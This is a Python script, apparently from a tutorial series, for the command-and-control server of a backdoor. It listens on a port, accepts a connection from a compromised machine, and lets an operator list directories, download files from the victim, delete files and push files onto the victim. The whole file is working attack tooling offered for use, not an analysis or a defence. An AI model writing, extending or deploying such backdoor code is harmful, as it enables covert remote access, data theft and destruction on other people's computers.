import os
import socket 
#Back Door program using python part 4 (Downloading files remotely) 8:42
s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host, port)) 
print("\nServer is runing @ ", host)
print("\nWaiting for connections...")
s.listen(1)
conn, addr = s.accept()
print("")
print(addr, " Has connected to the server")

while 1:
    print("")
    command = input(str("Command >> "))
    if command == "view_cwd":
        conn.send(command.encode())
        print("")
        print("Command send waiting for execution")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Command output: ", files)

    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("Custom dir: "))
        conn.send(user_input.encode())
        print("")
        print("Command send waiting for execution")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom dir result: ", files)

    elif command == "download_file":
        conn.send(command.encode())
        filepath = input(str("File directory name: "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        filename = input(str("Please enter a filename for the incoming file the extension: "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print("")
        print(filename, " Downloaded...")
        print("")
    elif command == "remove_file":
        conn.send(command.encode())
        fileanddir = input(str("File directry and file name: "))
        conn.send(fileanddir.encode())
        print("File has been removed")
    elif command == "send_file":
        file = input(str("Please enter file name and directory: "))
        filename = input(str("İn which name we send the file: "))
        data = open(file, "rb")
        file_data = data.read(7000)
        conn.send(file_data)
        print(file, " Has been sended")
        conn.send(filename.encode())
    else:
        print("Error: Command didn't worked!")
